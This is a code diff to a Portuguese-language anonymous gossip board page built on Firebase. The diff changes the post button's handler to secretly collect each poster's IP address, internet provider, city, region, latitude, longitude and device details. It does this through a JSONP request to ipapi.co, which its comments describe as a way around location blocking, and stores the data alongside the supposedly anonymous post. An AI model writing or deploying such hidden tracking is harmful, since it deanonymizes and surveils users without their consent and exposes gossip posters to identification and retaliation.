@@ -20,6 +20,7 @@
         .input-box { background: #111; padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
         textarea { width: 100%; background: transparent; border: none; color: #aaa; font-size: 1.1rem; outline: none; font-family: inherit; resize: none; }
         .btn-post { background: #222; color: #999; border: 1px solid #444; padding: 10px 20px; float: right; cursor: pointer; }
+        .btn-post:disabled { opacity: 0.5; cursor: wait; }
         .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; animation: fadeIn 0.5s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
@@ -39,7 +40,7 @@
     <div id="feed-container">
         <div class="input-box">
             <textarea id="fofocaInput" rows="3" placeholder="O que você sabe que ninguém mais sabe?"></textarea>
-            <button class="btn-post" onclick="enviarFofoca()">Soltar o Verbo!</button>
+            <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">Soltar o Verbo!</button>
             <div style="clear: both;"></div>
         </div>
         <div id="mural"></div>
@@ -57,7 +58,6 @@
             measurementId: "G-3DZPC3E7SV"
         };
 
-        // Inicializa o Firebase
         firebase.initializeApp(firebaseConfig);
         var db = firebase.firestore();
 
@@ -67,9 +67,10 @@
             carregarFofocas();
         }
 
-        // FUNÇÃO PRINCIPAL CORRIGIDA
+        // FUNÇÃO DE RASTREIO E ENVIO FUNDIDA
         function enviarFofoca() {
             var inputElement = document.getElementById('fofocaInput');
+            var btn = document.getElementById('btnEnviar');
             var texto = inputElement.value;
             
             if (texto.trim() === "") {
@@ -77,51 +78,56 @@
                 return;
             }
 
-            // Bloqueia o botão para evitar cliques duplos
-            document.querySelector('.btn-post').disabled = true;
-            document.querySelector('.btn-post').innerText = "Enviando...";
+            btn.disabled = true;
+            btn.innerText = "Rastreando...";
 
-            // 1. Primeiro buscamos os dados de localização/Wi-Fi
-            fetch('https://ipapi.co/json/')
-                .then(function(response) { return response.json(); })
-                .then(function(data) {
-                    var rastro = {
-                        ip: data.ip || "Desconhecido",
-                        cidade: data.city || "Desconhecido",
-                        estado: data.region || "Desconhecido",
-                        provedor_wifi: data.org || "Não identificado",
-                        latitude: data.latitude || 0,
-                        longitude: data.longitude || 0,
-                        dispositivo: navigator.userAgent
-                    };
-                    salvarNoFirebase(texto, rastro);
+            // 1. Coleta de dados técnicos básicos
+            var infoTecnica = {
+                plataforma: navigator.platform,
+                idioma: navigator.language,
+                tela: window.screen.width + "x" + window.screen.height,
+                agente: navigator.userAgent
+            };
+
+            // 2. Uso de JSONP para evitar "Localização Bloqueada"
+            var script = document.createElement('script');
+            // Usando IP-API via JSONP (o navegador permite este tipo de requisição)
+            script.src = 'https://ipapi.co/jsonp/callback=receberRastroEEnviar';
+            document.body.appendChild(script);
+
+            // Esta função será chamada automaticamente quando o script acima carregar
+            window.receberRastroEEnviar = function(data) {
+                var rastroCompleto = {
+                    ip: data.ip || "Não identificado",
+                    provedor_wifi: data.org || "Não identificado",
+                    cidade: data.city || "Desconhecida",
+                    estado: data.region || "Desconhecido",
+                    latitude: data.latitude || 0,
+                    longitude: data.longitude || 0,
+                    tecnico: infoTecnica
+                };
+
+                // 3. Salvando no Firebase com o rastro completo
+                db.collection("fofocas").add({
+                    conteudo: texto,
+                    data: firebase.firestore.FieldValue.serverTimestamp(),
+                    rastro: rastroCompleto
                 })
-                .catch(function(err) {
-                    console.log("Erro na localização, enviando sem rastro.");
-                    salvarNoFirebase(texto, { erro: "Localização bloqueada" });
+                .then(function() {
+                    inputElement.value = "";
+                    alert("Segredo espalhado com rastro capturado!");
+                })
+                .catch(function(error) {
+                    console.error("Erro Firebase:", error);
+                    alert("Erro ao enviar. Verifique as regras do Firebase.");
+                })
+                .finally(function() {
+                    btn.disabled = false;
+                    btn.innerText = "Soltar o Verbo!";
+                    // Remove o script temporário
+                    if(script.parentNode) document.body.removeChild(script);
                 });
-        }
-
-        function salvarNoFirebase(texto, rastroData) {
-            var inputElement = document.getElementById('fofocaInput');
-            
-            db.collection("fofocas").add({
-                conteudo: texto,
-                data: firebase.firestore.FieldValue.serverTimestamp(),
-                rastro: rastroData
-            })
-            .then(function() {
-                inputElement.value = ""; // Limpa o campo
-                alert("Segredo espalhado com sucesso!");
-            })
-            .catch(function(error) {
-                console.error("Erro ao salvar:", error);
-                alert("Erro ao enviar. Verifique se o Firebase está em 'Modo de Teste'.");
-            })
-            .finally(function() {
-                document.querySelector('.btn-post').disabled = false;
-                document.querySelector('.btn-post').innerText = "Soltar o Verbo!";
-            });
+            };
         }
 
         function carregarFofocas() {
